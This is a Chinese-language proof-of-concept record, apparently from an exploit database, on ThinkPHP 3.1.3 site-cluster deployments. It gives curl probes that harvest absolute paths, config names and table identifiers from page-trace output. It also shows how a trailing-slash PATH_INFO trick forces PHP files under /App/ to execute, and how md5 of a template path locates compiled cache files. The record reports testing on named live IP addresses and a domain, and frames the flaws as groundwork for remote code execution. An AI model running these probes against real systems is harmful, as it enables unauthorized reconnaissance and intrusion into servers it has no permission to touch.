# ThinkPHP 3.1.3 站群两个零凭证原生语：think_page_trace 泄全部内部路径 + /App/**/*.class.php 尾斜杠交 PHP-FPM 执行并回显绝对路径

- **code**: thinkphp-3.1.3-站群两个零凭证原生语-think_page_trace-泄全部内部路径-app
- **kind**: poc
- **category**: info-leak
- **component**: SomCNS 站群 CMS（ThinkPHP 3.1.3）
- **severity**: medium
- **source**: self
- **verified**: 1
- **verified_note**: 实测：① 45.151.135.166 任意页面（含 GET /Admin/Index/login 与登录失败页）尾部 think_page_trace 输出 15 个内部文件绝对路径（App/Runtime/~runtime.php、App/Conf/config.db.php、App/Conf/config.site.php）、DB 驱动与表标识 online.admin、查询次数与错误堆栈；② GET /App/Lib/Action/Home/OrderAction.class.php/ → 200/158B "Fatal error: Class 'CommonAction' not found in /www/wwwroot/kkjjer_com/App/Lib/Action/Home/OrderAction.class.php on line 3"；对照 /App/Conf/config.php/ → 200/0B，证明 nginx 对 /App/ 下 .php 无 deny、尾斜杠触发 fastcgi_split_path_info 后被交 PHP-FPM 执行；③ 45.151.135.176 上 GET /App/Lib/Action/Admin/UserAction.class.php/x → 同类 Fatal error 回显 /www/wwwroot/thisthbweb_com/...；④ 模板缓存 md5 校验：md5('/www/wwwroot/kkjjer_com/App/Tpl/Admin/Index_login.html')=2b724962a4253c82acc4c93906e7589f → 对应 Cache/Admin 下文件 200。
- **path**: pocs/thinkphp-3.1.3-站群两个零凭证原生语-think_page_trace-泄全部内部路径-app/poc.txt
- **tags**: thinkphp3.1.3,站群,path-info,display_errors,page_trace,信息泄露,绝对路径
- **created_at**: 2026-10-28T18:59:42.894Z
- **engine**: 45.151.135.166 / https://thbac1dsua6v.csnsg36j8n.xyz

## 描述

TP3.1.3 站群默认开着页面 trace 与 display_errors，且 nginx 未对 /App/ 目录做 deny，尾斜杠 PATH_INFO 会把任意 .class.php 交给 PHP-FPM 执行；两者组合可精确枚举配置文件清单、模板缓存命名与表前缀，并为「docroot 内落地 .php 即执行」提供执行通道。

## 用法

```
1) 读 trace：curl -k "https://TARGET/Admin/Index/login" | grep -iE "Fatal|/www/|queries|writes"
2) PATH_INFO 执行探针（同时当控制器存在性预言机）：
curl -k "https://TARGET/App/Lib/Action/Admin/UserAction.class.php/x"
# Class 'CommonAction' not found = 继承闸门；Class 'Action' not found = extends Action 脱队；404 = 文件不存在
curl -k "https://TARGET/App/Conf/config.php/"     # 200/0B = 存在且被执行
3) 模板缓存命中验证：md5(绝对路径) → /App/Runtime/Cache/<分组>/<md5大写>.php
```

## 正文

```
## 两个原生语

### A. think_page_trace 全开（零凭证）
任意请求（含后台登录页、登录失败页）页面尾部输出：
- 15 个加载文件的绝对路径（`/www/wwwroot/<项目>/App/Runtime/~runtime.php`、`App/Conf/config.db.php`、`App/Conf/config.site.php` …）
- 后台控制器/模板编译缓存文件名
- DB 驱动类与真实表标识（本例 `online.admin`）
- `查询信息 : N queries M writes` 与错误堆栈

### B. /App/ 目录 PATH_INFO 执行
```
GET /App/Lib/Action/Home/OrderAction.class.php/  → 200/158B
Fatal error: Class 'CommonAction' not found in /www/wwwroot/<项目>/App/Lib/Action/Home/OrderAction.class.php on line 3

GET /App/Conf/config.php/                        → 200/0B   （文件存在且被 PHP-FPM 执行）
GET /App/Conf/config.php~                        → 403      （备份后缀被 nginx deny，反证文件真实存在）
```
⇒ nginx 对 `/App/` 下 .php 无 deny；尾斜杠触发 `fastcgi_split_path_info` 后直接执行该文件。

## 附带产出：文件缓存 md5 算法
`md5('/www/wwwroot/<项目>/App/Tpl/Admin/Index_login.html')` → `/App/Runtime/Cache/Admin/<md5>.php`（200），可据此枚举/读取编译后的模板缓存。

## 影响
- 精确锁定配置文件清单、表前缀/库名，为 LFI/配置读取提供落点
- `/App/` 下落地 .php 即执行的通道，是写文件原语 → RCE 闭环的关键前置
```
